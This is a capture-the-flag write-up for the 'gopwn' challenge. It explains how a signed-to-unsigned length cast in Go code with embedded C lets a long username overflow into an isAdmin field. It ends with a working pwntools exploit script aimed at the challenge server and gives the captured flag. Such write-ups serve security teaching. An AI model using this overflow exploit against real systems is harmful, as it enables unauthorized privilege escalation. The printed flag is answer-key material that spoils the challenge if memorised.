https://ctftime.org/event/2660

# gopwn (pwn)

Recently, rumors emerged on the Dark Web, whispering about a secret flaw in THCity's government systems. A vulnerability that would allow access to sensitive information, threatening to reveal secrets that could tip the balance of the city.

Jhonny Jhon Jhonson, a dynamic young executive with the Aurora Initiative has entrusted you with the task of testing the security of the systems. His insistence on the extent of the damage such a vulnerability could cause resonates deeply with you. The idea that a breach in their systems could compromise critical infrastructure, or worse, allow outside forces to take control, sends a chill down your spine. You're determined to find the breach, whatever the cost. The future of the city may well depend on it.

## Analysis

We can see a very interesting feature of go in the following code. The ability to mixin c code:

```go
// #include <stdint.h>
// #include <stdlib.h>
// #include <string.h>
//
// #define MAX_SIZE_USERNAME 64
//
// struct User_t {
//   char username[MAX_SIZE_USERNAME];
//   int isAdmin;
// };
//
// int checkLength(int8_t length) {
//   if (length < MAX_SIZE_USERNAME) {
//     return 1;
//   }
//
//   return 0;
// }
//
// void init_user(struct User_t *user) {
//   user->isAdmin = 0;
//   memset(user->username, '\0', MAX_SIZE_USERNAME);
// }
//
// void setLoginUsername(char dst_username[MAX_SIZE_USERNAME], void *src_username, int8_t length) {
//   memcpy(dst_username, src_username, (uint8_t)length);
//   dst_username[MAX_SIZE_USERNAME-1] = '\0';
// }
import "C"
```

You can access this c code via `C` as follows:

```go
if C.checkLength(c_length) == 0 {
    //...
}
```

We must send data according to the following `Packet` format:

```go
type Packet struct {
    // -- Packet header
    Type   PacketType
    Length int8
    // -- Packet header end
    Data []byte
}
```

We can see from the following code that 1, 2, 3, and 4 are valid values for the `int8` representing the packet type:

```go
type PacketType int8

const (
    Login PacketType = 1 + iota
    Logout
    Flag
    Exit
)
```

We can see from the following code that the packet's length must not return 0 when passed to `checkLength`:

```go
// Check length is less than max size allowed
c_length := C.int8_t(packet.Length)
if C.checkLength(c_length) == 0 {
    resPacket.Response = "Packet exceeds max length !\n"
    resPacket.Length = int16(len(resPacket.Response))
    con.Write(resPacket.Bytes())
    continue
}
```

We can see that `checkLength` will return 1 when we supply a negative value, such as 0xff, for `length`:

```go
// int checkLength(int8_t length) {
//   if (length < MAX_SIZE_USERNAME) {
//     return 1;
//   }
//
//   return 0;
// }
//
```

We can see in the following code that a negative value for `length` will be treated as a positive value up to 0xff by `setLoginUsername`:

```go
// void setLoginUsername(char dst_username[MAX_SIZE_USERNAME], void *src_username, int8_t length) {
//   memcpy(dst_username, src_username, (uint8_t)length);
//   dst_username[MAX_SIZE_USERNAME-1] = '\0';
// }
```

This would let us overflow the username into the bytes that represent the `isAdmin` flag in a `User` struct.

## Solution

1) Send a `Login` packet with a large negative length that lets us overwrite the value of `isAdmin`
2) Send a `Flag` packet now that the value of `isAdmin` is `1`

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
p = remote("74.234.198.209", 33243)

payload = b""
payload += p8(1) # login
payload += p8(0xff)
payload += b"A" * 64
payload += p64(1) # isAdmin
p.sendline(payload)

payload = b""
payload += p8(3) # flag
payload += p8(0)
p.sendline(payload)

p.readuntil(b"THC{")
print("THC{" + p.readuntil(b"}").decode()) # THC{C4r3fUL_w17h_1N7_0v3rf10w_U51n9_C_1N_G0}
```

## Flag
`THC{C4r3fUL_w17h_1N7_0v3rf10w_U51n9_C_1N_G0}`

smiley 2025/04/12
